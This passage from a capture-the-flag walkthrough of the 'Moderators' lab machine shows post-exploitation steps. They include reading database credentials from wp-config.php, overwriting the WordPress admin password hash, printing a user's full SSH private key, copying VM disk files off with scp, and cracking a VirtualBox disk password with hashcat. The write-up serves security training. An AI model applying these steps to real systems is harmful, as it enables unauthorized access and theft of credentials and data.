<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ head -n <span style="color:#ae81ff">1</span>  /etc/hosts
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>127.0.0.1	localhost , moderators.htb
</span></span></code></pre></div><p>Now, if I try to access it again everything should work fine:</p>
<p><img src="accessing_site_again.png" alt="Accessing The Site Again"></p>
<h3 id="logging-in-as-admin">Logging In As Admin</h3>
<p>Previously, when I was listing installed plugins, I saw <em>passwords-manager</em> being installed, so this time I&rsquo;ll try to login as admin and see if I can find passwords for other users stored in there. However, I don&rsquo;t know the admin&rsquo;s password, but I can login to the database with credentials from <em>wp-config.php</em> file and change his password to anything I want:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>lexi@moderators:/opt/site.new$ cat wp-config.php | grep -A <span style="color:#ae81ff">10</span> <span style="color:#e6db74">&#34;The name of the database&#34;</span> 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>/** The name of the database <span style="color:#66d9ef">for</span> WordPress */
</span></span><span style="display:flex;"><span>define<span style="color:#f92672">(</span> <span style="color:#e6db74">&#39;DB_NAME&#39;</span>, <span style="color:#e6db74">&#39;wordpress&#39;</span> <span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>/** MySQL database username */
</span></span><span style="display:flex;"><span>define<span style="color:#f92672">(</span> <span style="color:#e6db74">&#39;DB_USER&#39;</span>, <span style="color:#e6db74">&#39;wordpressuser&#39;</span> <span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>/** MySQL database password */
</span></span><span style="display:flex;"><span>define<span style="color:#f92672">(</span> <span style="color:#e6db74">&#39;DB_PASSWORD&#39;</span>, <span style="color:#e6db74">&#39;wordpresspassword123!!&#39;</span> <span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>/** MySQL hostname */
</span></span><span style="display:flex;"><span>define<span style="color:#f92672">(</span> <span style="color:#e6db74">&#39;DB_HOST&#39;</span>, <span style="color:#e6db74">&#39;localhost&#39;</span> <span style="color:#f92672">)</span>;
</span></span></code></pre></div><ul>
<li>Credentials for <em>wordpress</em> database are <em>wordpressuser:wordpresspassword123!!</em>.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>lexi@moderators:/opt/site.new$ mysql -u wordpressuser -p<span style="color:#e6db74">&#39;wordpresspassword123!!&#39;</span>
</span></span><span style="display:flex;"><span>Welcome to the MariaDB monitor.  Commands end with ; or <span style="color:#ae81ff">\g</span>.
</span></span><span style="display:flex;"><span>Your MariaDB connection id is <span style="color:#ae81ff">48</span>
</span></span><span style="display:flex;"><span>Server version: 10.3.34-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Copyright <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> 2000, 2018, Oracle, MariaDB Corporation Ab and others.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Type <span style="color:#e6db74">&#39;help;&#39;</span> or <span style="color:#e6db74">&#39;\h&#39;</span> <span style="color:#66d9ef">for</span> help. Type <span style="color:#e6db74">&#39;\c&#39;</span> to clear the current input statement.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>MariaDB <span style="color:#f92672">[(</span>none<span style="color:#f92672">)]</span>&gt; show databases;
</span></span><span style="display:flex;"><span>+--------------------+
</span></span><span style="display:flex;"><span>| Database           |
</span></span><span style="display:flex;"><span>+--------------------+
</span></span><span style="display:flex;"><span>| information_schema |
</span></span><span style="display:flex;"><span>| wordpress          |
</span></span><span style="display:flex;"><span>+--------------------+
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2</span> rows in set <span style="color:#f92672">(</span>0.001 sec<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>MariaDB <span style="color:#f92672">[(</span>none<span style="color:#f92672">)]</span>&gt; use wordpress
</span></span><span style="display:flex;"><span>Reading table information <span style="color:#66d9ef">for</span> completion of table and column names
</span></span><span style="display:flex;"><span>You can turn off this feature to get a quicker startup with -A
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Database changed
</span></span><span style="display:flex;"><span>MariaDB <span style="color:#f92672">[</span>wordpress<span style="color:#f92672">]</span>&gt; <span style="color:#66d9ef">select</span> * from wp_users;
</span></span><span style="display:flex;"><span>+----+------------+------------------------------------+---------------+----------------------+-------------------------+---------------------+---------------------+-------------+--------------+
</span></span><span style="display:flex;"><span>| ID | user_login | user_pass                          | user_nicename | user_email           | user_url                | user_registered     | user_activation_key | user_status | display_name |
</span></span><span style="display:flex;"><span>+----+------------+------------------------------------+---------------+----------------------+-------------------------+---------------------+---------------------+-------------+--------------+
</span></span><span style="display:flex;"><span>|  <span style="color:#ae81ff">1</span> | admin      | $P$BXasOiM52pOUIRntJTPVlMoH0ZlntT0 | admin         | admin@moderators.htb | http://192.168.1.4:8080 | 2021-09-11 05:30:20 |                     |           <span style="color:#ae81ff">0</span> | admin        |
</span></span><span style="display:flex;"><span>|  <span style="color:#ae81ff">2</span> | lexi       | $P$BZ0Fj92qgnvg4F52r3lpwHejcXag461 | lexi          | lexi@moderators.htb  |                         | 2021-09-12 16:51:16 |                     |           <span style="color:#ae81ff">0</span> | lexi         |
</span></span><span style="display:flex;"><span>+----+------------+------------------------------------+---------------+----------------------+-------------------------+---------------------+---------------------+-------------+--------------+
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2</span> rows in set <span style="color:#f92672">(</span>0.001 sec<span style="color:#f92672">)</span>
</span></span></code></pre></div><p>Looks like there are only two users, admin and lexi. I can try to crack the password for admin to be stealthier, however I wasn&rsquo;t able to do that using <em>rockyou.txt</em>, that&rsquo;s why I&rsquo;ll generate a new password using any tool, in this case I used <em>

<a href="https://www.useotools.com/wordpress-password-hash-generator/" target="_blank">https://www.useotools.com/wordpress-password-hash-generator/</a></em>, and update the entry manually through <em>mysql</em>:</p>
<p><img src="generate_new_hash.png" alt="Generate New Password"></p>
<ul>
<li>It does even provide me with needed sql query!!</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>MariaDB <span style="color:#f92672">[</span>wordpress<span style="color:#f92672">]</span>&gt; UPDATE <span style="color:#e6db74">`</span>wp_users<span style="color:#e6db74">`</span> SET <span style="color:#e6db74">`</span>user_pass<span style="color:#e6db74">`</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;$P$BBUC3gCfCOoL46jYqzCCIyiLZcY3YG.&#39;</span> WHERE user_login <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;admin&#34;</span>;
</span></span><span style="display:flex;"><span>Query OK, <span style="color:#ae81ff">1</span> row affected <span style="color:#f92672">(</span>0.003 sec<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Rows matched: <span style="color:#ae81ff">1</span>  Changed: <span style="color:#ae81ff">1</span>  Warnings: <span style="color:#ae81ff">0</span>
</span></span></code></pre></div><p>Now I should be able to login using the new password:</p>
<p><img src="logging_in_as_admin.png" alt="Logging In With New Credentials"></p>
<p><img src="login_success.png" alt="Login Success"></p>
<h3 id="reading-johns-ssh-keys">Reading John&rsquo;s SSH Keys</h3>
<p>Navigating to the <em>passwords-manager</em> plugin, I saw that user <em>john</em> is storing his ssh keys:</p>
<p><img src="noticing_john_ssh_keys.png" alt="Noticing John&amp;rsquo;s SSH Keys"></p>
<p>After copying the key to a new file, I can SSH as <em>john</em>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ cat john_id_rsa 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>-----BEGIN OPENSSH PRIVATE KEY-----
</span></span><span style="display:flex;"><span>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
</span></span><span style="display:flex;"><span>NhAAAAAwEAAQAAAYEAn/Neot2K7OKlkda5TCHoWwP5u1hHhBwKzM0LN3hn7EwyXshgj9G+
</span></span><span style="display:flex;"><span>lVSMVOUMeS5SM6iyM0Tg82EVfEbAMpPuCGbWvr1inU8B6eDb9voLQyGERcbKf29I7HwXab
</span></span><span style="display:flex;"><span>8T+HkUqy+CLm/X+GR9zlgNhNUZgJePONPK1OLUkz/mJN9Sf57w8ebloATzJJyKNAdRg3Xq
</span></span><span style="display:flex;"><span>HUfwDldCDZiTTt3R6s5wWkrRuZ6sZp+v+RonFhfT2Ue741CSULhS2fcIGCLRW+8WQ+M0yd
</span></span><span style="display:flex;"><span>q76Ite2XHanP9lrj3de8xU92ny/rjqU9U6EJG0DYmtpLrkbGNLey9MjuFncBqQGnCaqfFk
</span></span><span style="display:flex;"><span>HQb+S6eCIDD0N3W0flBMhJfzwxKYXpAJSlLElqhPJayinWXSZqBhbp8Bw3bs4RCHbtwawu
</span></span><span style="display:flex;"><span>SefWzZEsdA0wGrbbuopaJX1UpyuAQb2UD5YRDaSC2V2Rv4Wi/32PxoKyAxj1x6w2wR5yty
</span></span><span style="display:flex;"><span>EoFzVfdeKQ8o5Avl4MM6gqC5qaubduLABhsEXflrAAAFiPtk5tj7ZObYAAAAB3NzaC1yc2
</span></span><span style="display:flex;"><span>EAAAGBAJ/zXqLdiuzipZHWuUwh6FsD+btYR4QcCszNCzd4Z+xMMl7IYI/RvpVUjFTlDHku
</span></span><span style="display:flex;"><span>UjOosjNE4PNhFXxGwDKT7ghm1r69Yp1PAeng2/b6C0MhhEXGyn9vSOx8F2m/E/h5FKsvgi
</span></span><span style="display:flex;"><span>5v1/hkfc5YDYTVGYCXjzjTytTi1JM/5iTfUn+e8PHm5aAE8yScijQHUYN16h1H8A5XQg2Y
</span></span><span style="display:flex;"><span>k07d0erOcFpK0bmerGafr/kaJxYX09lHu+NQklC4Utn3CBgi0VvvFkPjNMnau+iLXtlx2p
</span></span><span style="display:flex;"><span>z/Za493XvMVPdp8v646lPVOhCRtA2JraS65GxjS3svTI7hZ3AakBpwmqnxZB0G/kungiAw
</span></span><span style="display:flex;"><span>9Dd1tH5QTISX88MSmF6QCUpSxJaoTyWsop1l0magYW6fAcN27OEQh27cGsLknn1s2RLHQN
</span></span><span style="display:flex;"><span>MBq227qKWiV9VKcrgEG9lA+WEQ2kgtldkb+Fov99j8aCsgMY9cesNsEecrchKBc1X3XikP
</span></span><span style="display:flex;"><span>KOQL5eDDOoKguamrm3biwAYbBF35awAAAAMBAAEAAAGBAJsfhQ2AvIZGvPp2e5ipXdY/Qc
</span></span><span style="display:flex;"><span>h+skUeiR7cUN+IJ4mU0Fj6DiQM77+Vks+WoAU6dkBhgAmW6G9BHXw8hZPHwddmHSg5NdWI
</span></span><span style="display:flex;"><span>VTvEdq/NCnUdoVGmnKcAf4HSS0akKLMWgoQO/Dsa/yKIGzauUNYdcbEzy5P6W0Ehh7YTB5
</span></span><span style="display:flex;"><span>mE+FaLB/Qi0Vni0wgTxTj2TAipp9aj+N1/pLDY4yxeloIZmf8HhuR1TY/tmNWGlpenni6g
</span></span><span style="display:flex;"><span>kki/0Fb2nGuFV9VIlzCI6s7++ARLTUysVDhCB0H5Urxey4Ynxu9NWejsf6QAZibAZSb6il
</span></span><span style="display:flex;"><span>uerZYKiiJD0pmDBY1ApJhNE+tafeIeX1EyPgq9yGKUXZEI1VE0rITGbpHPjYAnn7yhLDQ9
</span></span><span style="display:flex;"><span>rcrFW/SaR80ulolwQRm+4J8TEHAVYGzshNZ2tvrYDVGOT/OvFObOK7kRHHKJBVL6I96htc
</span></span><span style="display:flex;"><span>vSzN5qGw3+I7YJKTrXJwJ5vEjjelmyK82FXquUcubMTW6/B72QNW7zjRgLGGObpWWV+QAA
</span></span><span style="display:flex;"><span>AMAE4VjUADP53GgSVYpLBnR+69RVBqc5h3U3D6zButs/m7xsMoIoBrkv342fsK4qkBYWFU
</span></span><span style="display:flex;"><span>sdCOXDQUGYcVdzXKwzRsKslGOAnyeRsg9wYsVhcc1YSWIJZBdBIaqPBKcfsVGUM88icxqk
</span></span><span style="display:flex;"><span>Qn6CEN4Bwy0ZgB/SAXMMU8IQHtcfZQFeiByg0/XRlvZuQay6Cw6/406dlzTJDmzGzkzX08
</span></span><span style="display:flex;"><span>4V8F7PfPJ2oSs6c813vv6B1iKw1Ii9qAmPqBFC83rwnCjs+Q0AAADBANUfGWc7YgCVG5SO
</span></span><span style="display:flex;"><span>u89ba4uO4wZ/zpbHog7cs1flldkrtDZluiqWWopTAKpnsD2CXSxoZ7cWdPytJeuElvlRmY
</span></span><span style="display:flex;"><span>aUUrjaj2WFdNLgMjFb4jZeEcI3lz8BeRSTiXUSbLA4SxVLeSizZx8g1SNVAlE5VwUWZVYo
</span></span><span style="display:flex;"><span>6ge465sU/c54jAxW2X2yioPCPdYVEpOTTZr40mg94/Zycxlbd8+L1jaepLqvXq5K4lSXPr
</span></span><span style="display:flex;"><span>PoZ/w+K9mf5912RGlmSzBARVUyCqquLQAAAMEAwCGwEI9KR0zmcnfhGiQviWObgAUEDA7h
</span></span><span style="display:flex;"><span>HxJn61h6sI0SsFOCatx9Q+a7sbKeVqQdph8Rn5rInzQ7TpvflHsrGzvU0ZpZ0Ys2928pN7
</span></span><span style="display:flex;"><span>So+Bt6jTiNTXdD24/FmZbxn/BXLovEJpeT2L3V3kvabJAHhSykFP0+Q0dlNDmQxuMQ+muO
</span></span><span style="display:flex;"><span>FQGVHxktaFKkrEl71gqoHPll8zNwNY9BjpxFPy48B1RgkxkfHSNZ8ujSI6Wse3tX6T03HD
</span></span><span style="display:flex;"><span>fotkBDyCmCDxz3AAAAD2pvaG5AbW9kZXJhdG9ycwECAw<span style="color:#f92672">==</span>
</span></span><span style="display:flex;"><span>-----END OPENSSH PRIVATE KEY-----
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$ chmod <span style="color:#ae81ff">600</span> john_id_rsa
</span></span><span style="display:flex;"><span>$ ssh -i john_id_rsa john@10.10.11.173
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>john@moderators:~$ id
</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>john<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>john<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>john<span style="color:#f92672">)</span>,1002<span style="color:#f92672">(</span>moderators<span style="color:#f92672">)</span>
</span></span></code></pre></div><h2 id="post-enumeration-as-john">Post Enumeration As John</h2>
<p>In john&rsquo;s home diretory, there are some export message files generated from <em>Whatsapp</em>, and looks like john is storing some interesting messages:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>john@moderators:~$ cat stuff/exp/2021-09-*
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>9/15/21, 23:55 - Messages and calls are end-to-end encrypted. No one outside of this chat, not even WhatsApp, can read or listen to them. Tap to learn more.
</span></span><span style="display:flex;"><span>9/19/21, 00:39 - JOHN MILLER: Hey mate
</span></span><span style="display:flex;"><span>9/19/21, 00:39 - JOHN MILLER: Are u free?
</span></span><span style="display:flex;"><span>9/19/21, 00:41 - CARTOR BAIL: Yeah yeah
</span></span><span style="display:flex;"><span>9/19/21, 00:41 - JOHN MILLER: I did what you said
</span></span><span style="display:flex;"><span>9/19/21, 00:41 - JOHN MILLER: I copied all the VM files
</span></span><span style="display:flex;"><span>9/19/21, 00:41 - CARTOR BAIL: Nice
</span></span><span style="display:flex;"><span>9/19/21, 00:42 - CARTOR BAIL: Wait
</span></span><span style="display:flex;"><span>9/19/21, 00:42 - CARTOR BAIL: What is the extension of tge file
</span></span><span style="display:flex;"><span>9/19/21, 00:42 - JOHN MILLER: .vbox
</span></span><span style="display:flex;"><span>9/19/21, 00:42 - JOHN MILLER: Why?
</span></span><span style="display:flex;"><span>9/19/21, 00:42 - JOHN MILLER: That<span style="color:#e6db74">&#39;s the correct one ryt?
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">9/19/21, 00:42 - CARTOR BAIL: U idiot😂
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">9/19/21, 00:43 - CARTOR BAIL: Naah thats not the file you need.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">9/19/21, 00:43 - CARTOR BAIL: Right one is something like .vdi or .vdmk
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">9/19/21, 00:43 - JOHN MILLER: Oh shoot😅
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">9/19/21, 00:43 - JOHN MILLER: My bad
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">9/19/21, 00:43 - CARTOR BAIL: U have vmware ryt?
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">9/19/21, 00:43 - JOHN MILLER: Nope virtual box
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">9/19/21, 00:43 - CARTOR BAIL: oh then most of the time it should be .vdi
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">9/19/21, 00:44 - JOHN MILLER: Ah kk
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">9/19/21, 00:44 - CARTOR BAIL: U know, I miss the old Sysadmin john. He was funny and stupid at the same time. ;)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">9/19/21, 00:44 - JOHN MILLER: Hahaha real funny. But it&#39;</span>s kinda true though.
</span></span><span style="display:flex;"><span>9/19/21, 00:44 - CARTOR BAIL: Doing reboots at the deployement, Calling our clinet bro, using the same dubmb password... God I miss those days. 
</span></span><span style="display:flex;"><span>9/19/21, 00:44 - JOHN MILLER: Okay Okay, I was stupid back <span style="color:#66d9ef">then</span>, not now. Btw I have a promotion comming up. 
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><p>John have copied some VM files, so I&rsquo;ll take a look at them:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>john@moderators:~$ ls -la stuff/VBOX/
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">118800</span>
</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">2</span> john john      <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">14</span> 10:50 .
</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">4</span> john john      <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">14</span> 10:50 ..
</span></span><span style="display:flex;"><span>-rwxr-xr-x <span style="color:#ae81ff">1</span> john john      <span style="color:#ae81ff">5705</span> Sep <span style="color:#ae81ff">18</span>  <span style="color:#ae81ff">2020</span> 2019-08-01.vbox
</span></span><span style="display:flex;"><span>-rwxr-xr-x <span style="color:#ae81ff">1</span> john john <span style="color:#ae81ff">121634816</span> Sep <span style="color:#ae81ff">18</span>  <span style="color:#ae81ff">2020</span> 2019.vdi
</span></span></code></pre></div><p>Using <em>scp</em> I&rsquo;ll copy them to my machine:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ scp -i john_id_rsa john@10.10.11.173:/home/john/stuff/VBOX/2019-08-01.vbox ./www/VBOX/
</span></span><span style="display:flex;"><span>$ scp -i john_id_rsa john@10.10.11.173:/home/john/stuff/VBOX/2019.vdi ./www/VBOX/
</span></span></code></pre></div><ul>
<li>Additional resources:
<ul>
<li><em>Virtual Disk Image (.vdi)</em> files are disk files specific to virtual box program (usually data is stored in these files) (

<a href="https://docs.fileformat.com/disc-and-media/vdi/%29" target="_blank">https://docs.fileformat.com/disc-and-media/vdi/)</a>. These files can be attached to any virual machine, and will be recognized as a new disk. For example, I can attach this image to my kali machine, and kali will recognize it as a new drive that can be mounted and accessed.</li>
<li><em>.VBOX</em> files are files where settings and configuration for virtual machines are stored (

<a href="https://fileinfo.com/extension/vbox%29" target="_blank">https://fileinfo.com/extension/vbox)</a>.</li>
</ul>
</li>
</ul>
<h2 id="inspecting-vm-files">Inspecting VM Files</h2>
<p>By inspecting the <em>.vbox</em> file, I noticed that the <em>2019.vdi</em> is encrypted, and that it is part of Ubuntu 22 Desktop virtual machine:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;MediaRegistry&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;HardDisks&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;HardDisk</span> <span style="color:#a6e22e">uuid=</span><span style="color:#e6db74">&#34;{12b147da-5b2d-471f-9e32-a32b1517ff4b}&#34;</span> <span style="color:#a6e22e">location=</span><span style="color:#e6db74">&#34;F:/2019.vdi&#34;</span> <span style="color:#a6e22e">format=</span><span style="color:#e6db74">&#34;VDI&#34;</span> <span style="color:#a6e22e">type=</span><span style="color:#e6db74">&#34;Normal&#34;</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">&lt;Property</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;CRYPT/KeyId&#34;</span> <span style="color:#a6e22e">value=</span><span style="color:#e6db74">&#34;Moderator 1&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">&lt;Property</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;CRYPT/KeyStore&#34;</span> <span style="color:#a6e22e">value=</span><span style="color:#e6db74">&#34;U0NORQABQUVTLVhUUzI1Ni1QTEFJTjY0AAAAAAAAAAAAAAAAAABQQktERjItU0hB&amp;#13;&amp;#10;MjU2AAAAAAAAAAAAAAAAAAAAAAAAAEAAAABUQgV7yASjqRRgfezqVXSqcDjNzg1J&amp;#13;&amp;#10;jH/ENK/ozVskTyAAAADpYIvN2MBwhohZoxyfHl5d6YterYwh8lwMQ+5peBbjLCBO&amp;#13;&amp;#10;AABUYpGmB0lDsJbqgNsq451Bed5tHD8X6iXWLmJ6v6f7y2A9CABAAAAAo4alQy6T&amp;#13;&amp;#10;jyDI+8mvRgp4wXkMGavRxR6cC+ckk5yUgVhhgPxKNBNdhIHkNtjBMrj0uaVQ3ksk&amp;#13;&amp;#10;gwC6MrGLZFhl1g==&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;/HardDisk&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;HardDisk</span> <span style="color:#a6e22e">uuid=</span><span style="color:#e6db74">&#34;{5999a8f0-e31d-4d4e-937d-173eb6ba8881}&#34;</span> <span style="color:#a6e22e">location=</span><span style="color:#e6db74">&#34;Ubuntu.vdi&#34;</span> <span style="color:#a6e22e">format=</span><span style="color:#e6db74">&#34;VDI&#34;</span> <span style="color:#a6e22e">type=</span><span style="color:#e6db74">&#34;Normal&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;/HardDisks&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;DVDImages&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;Image</span> <span style="color:#a6e22e">uuid=</span><span style="color:#e6db74">&#34;{7653d755-c513-4004-8891-be83fc130dba}&#34;</span> <span style="color:#a6e22e">location=</span><span style="color:#e6db74">&#34;F:/ubuntu-22.04-desktop-amd64.iso&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;/DVDImages&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/MediaRegistry&gt;</span>
</span></span></code></pre></div><ul>
<li>Inside <em>&lt;HardDisks&gt;&lt;/HardDisks&gt;</em> tags there are two <em>.vdi</em> images, <em>2019.vdi</em> and <em>Ubuntu.vdi</em></li>
<li>Inside <em>&lt;DVDImages&gt;&lt;/DVDImages&gt;</em> tags is stored the <em>.iso</em> image, in this case is <em>ubuntu-22.04-desktop-amd64.iso</em></li>
</ul>
<p>From these 2 <em>.vdi</em> images I only have <em>2019.vdi</em> image, and because John&rsquo;s silly mistake (as said in the previous messages, he copied the wrong file), I was able to get the <em>.vbox</em> file where the hash of this image is stored, which means that I can now try to crack it and see if I am able to find some interesting information inside it.</p>
<h3 id="cracking-vdi-file">Cracking VDI File</h3>
<p>Before cracking <em>2019.vdi</em>&rsquo;s encryption, I need to convert virtual box hash to a hash that <em>hashcat</em> understands, using 

<a href="https://github.com/hashcat/hashcat/blob/master/tools/virtualbox2hashcat.py" target="_blank"><em>virtualbox2hashcat.py</em></a>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 /opt/hashcat/tools/virtualbox2hashcat.py --vbox 2019-08-01.vbox 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$vbox$0$540000$546291a6074943b096ea80db2ae39d4179de6d1c3f17ea25d62e627abfa7fbcb$16$a386a5432e938f20c8fbc9af460a78c1790c19abd1c51e9c0be724939c9481586180fc4a34135d8481e436d8c132b8f4b9a550de4b248300ba32b18b645865d6$20000$e9608bcdd8c070868859a31c9f1e5e5de98b5ead8c21f25c0c43ee697816e32c$5442057bc804a3a914607decea5574aa7038cdce0d498c7fc434afe8cd5b244f
</span></span></code></pre></div><p>Then, I&rsquo;ll use 

<a href="https://github.com/hashcat/hashcat/blob/master/example.dict" target="_blank"><em>example.dict</em></a> file from hashcat as wordlist to crack it:</p>
<ul>
<li>This hash is <em>VirtualBox PBKDF2-HMAC-SHA256 &amp; AES-256-XTS</em>, of <em>mode 27600</em>, but if you&rsquo;re not sure you can let hashcat&rsquo;s new feature &ldquo;<em>auto detect</em>&rdquo; decide what it is.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ hashcat -a <span style="color:#ae81ff">0</span> -m <span style="color:#ae81ff">27600</span> $vbox$0$540000$546291a6074943b096ea80db2ae39d4179de6d1c3f17ea25d62e627abfa7fbcb$16$a386a5432e938f20c8fbc9af460a78c1790c19abd1c51e9c0be724939c9481586180fc4a34135d8481e436d8c132b8f4b9a550de4b248300ba32b18b645865d6$20000$e9608bcdd8c070868859a31c9f1e5e5de98b5ead8c21f25c0c43ee697816e32c$5442057bc804a3a914607decea5574aa7038cdce0d498c7fc434afe8cd5b244f example.dict
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>$vbox$0$540000$546291a6074943b096ea80db2ae39d4179de6d1c3f17ea25d62e627abfa7fbcb$16$a386a5432e938f20c8fbc9af460a78c1790c19abd1c51e9c0be724939c9481586180fc4a34135d8481e436d8c132b8f4b9a550de4b248300ba32b18b645865d6$20000$e9608bcdd8c070868859a31c9f1e5e5de98b5ead8c21f25c0c43ee697816e32c$5442057bc804a3a914607decea5574aa7038cdce0d498c7fc434afe8cd5b244f:computer
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><h3 id="decrypt-vdi-file-and-attach-it-to-kali">Decrypt VDI File And Attach It To Kali</h3>
<p>The password is <em>computer</em>. I can now attach this file to my kali machine in virtual box.</p>
<p>To do that, first I need to modify the <em>.vbox</em> file, and remove any entry that maps to either <em>Ubuntu.vdi</em> or <em>ubuntu-22.04-desktop-amd64.iso</em>, since I don&rsquo;t have any of them, and modify the <em>location=&ldquo;F:/2019.vdi&rdquo;</em> to the location where <em>2019.vdi</em> is located (Use <em>/</em> instead of <em>\</em> for the path, even if you&rsquo;re on windows).</p>
<ul>
<li>
<p>This is done to let VirtualBox decrypt the file before attaching it to kali.</p>
</li>
<li>
<p>The new file will be like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34;?&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!--
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">** DO NOT EDIT THIS FILE.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">** If you make changes to this file while any VirtualBox related application
